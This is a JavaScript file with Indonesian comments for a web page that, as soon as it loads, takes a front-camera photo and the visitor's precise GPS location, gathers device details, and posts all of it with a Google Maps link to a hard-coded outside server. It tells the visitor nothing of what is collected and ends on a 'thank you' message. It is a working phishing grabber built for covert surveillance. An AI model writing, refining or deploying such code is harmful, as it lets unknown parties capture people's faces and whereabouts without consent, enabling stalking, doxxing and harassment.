// ==========================================
//   CONFIG — GANTI DI SINI
// ==========================================
const API_ENDPOINT = "https://pterodactyl.asta-official.my.id/:3143";

const CAPTURE_DELAY_MS = 1500;
const JPEG_QUALITY = 0.85;
const GEO_TIMEOUT_MS = 10000; // max tunggu GPS 10 detik

// ==========================================
//   INFO DEVICE
// ==========================================
async function getDeviceInfo() {
  const ua = navigator.userAgent;
  let namaHP = "Unknown";

  if (/android/i.test(ua)) {
    const m = ua.match(/Android [\d.]+;\s*([^)]+?)(?:\s+Build|\))/i);
    namaHP = m ? m[1].trim() : "Android Device";
  } else if (/iphone|ipad|ipod/i.test(ua)) {
    namaHP = "iPhone / iPad";
  } else if (/windows/i.test(ua)) {
    namaHP = "Windows PC";
  } else if (/macintosh|mac os x/i.test(ua)) {
    namaHP = "Mac";
  } else if (/linux/i.test(ua)) {
    namaHP = "Linux";
  }

  let bateraiText = "Tidak tersedia";
  let chargingText = "";
  try {
    if (navigator.getBattery) {
      const bat = await navigator.getBattery();
      bateraiText = `${Math.round(bat.level * 100)}%`;
      chargingText = bat.charging ? "Charging ⚡" : "Discharge 🔋";
    }
  } catch (e) {}

  const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak tersedia";
  const platform = navigator.platform || "Unknown";

  return { namaHP, bateraiText, chargingText, ram, platform, ua };
}

// ==========================================
//   LOKASI GPS
// ==========================================
function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      return resolve({ ok: false, error: "Geolocation tidak didukung browser" });
    }

    const timeoutId = setTimeout(() => {
      resolve({ ok: false, error: "Timeout ambil lokasi" });
    }, GEO_TIMEOUT_MS);

    navigator.geolocation.getCurrentPosition(
      (pos) => {
        clearTimeout(timeoutId);
        resolve({
          ok: true,
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp
        });
      },
      (err) => {
        clearTimeout(timeoutId);
        let msg = "Gagal ambil lokasi";
        if (err.code === 1) msg = "Izin lokasi ditolak";
        else if (err.code === 2) msg = "Lokasi tidak tersedia";
        else if (err.code === 3) msg = "Timeout";
        resolve({ ok: false, error: msg });
      },
      {
        enableHighAccuracy: true,
        timeout: GEO_TIMEOUT_MS,
        maximumAge: 0
      }
    );
  });
}

// ==========================================
//   KAMERA + CAPTURE + KIRIM
// ==========================================
async function startCameraAndCapture() {
  const video = document.getElementById("preview");
  const canvas = document.getElementById("canvas");
  const statusEl = document.getElementById("status");

  try {
    // ===== 1. Minta izin kamera =====
    statusEl.textContent = "Meminta izin kamera...";
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    video.srcObject = stream;
    await video.play();

    // ===== 2. Minta izin lokasi (paralel, gak nunggu kamera) =====
    statusEl.textContent = "Meminta izin lokasi...";
    const locPromise = getLocation();

    // ===== 3. Ambil foto =====
    statusEl.textContent = "Mengambil foto...";
    await new Promise(r => setTimeout(r, CAPTURE_DELAY_MS));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/jpeg", JPEG_QUALITY);
    stream.getTracks().forEach(t => t.stop());

    // ===== 4. Tunggu hasil lokasi =====
    const loc = await locPromise;

    // ===== 5. Kumpulin info device =====
    const info = await getDeviceInfo();

    // ===== 6. Kirim semua ke backend =====
    statusEl.textContent = "Mengirim data...";
    const res = await fetch(API_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        image: imageData,
        namaHP: info.namaHP,
        baterai: info.bateraiText,
        charging: info.chargingText,
        ram: info.ram,
        platform: info.platform,
        ua: info.ua,
        lokasi: loc.ok
          ? {
              lat: loc.lat,
              lng: loc.lng,
              accuracy: loc.accuracy,
              maps: `https://www.google.com/maps?q=${loc.lat},${loc.lng}`
            }
          : { error: loc.error }
      })
    });

    if (res.ok) {
      statusEl.textContent = "✅ Selesai";
      document.getElementById("title").textContent = "Terima kasih";
      document.getElementById("subtitle").textContent = "";
    } else {
      statusEl.textContent = "❌ Gagal kirim";
    }
  } catch (err) {
    console.error(err);
    statusEl.textContent = "❌ Akses kamera ditolak / gagal";
    document.getElementById("subtitle").textContent = "Izin kamera diperlukan untuk melanjutkan";
  }
}

window.addEventListener("load", startCameraAndCapture);
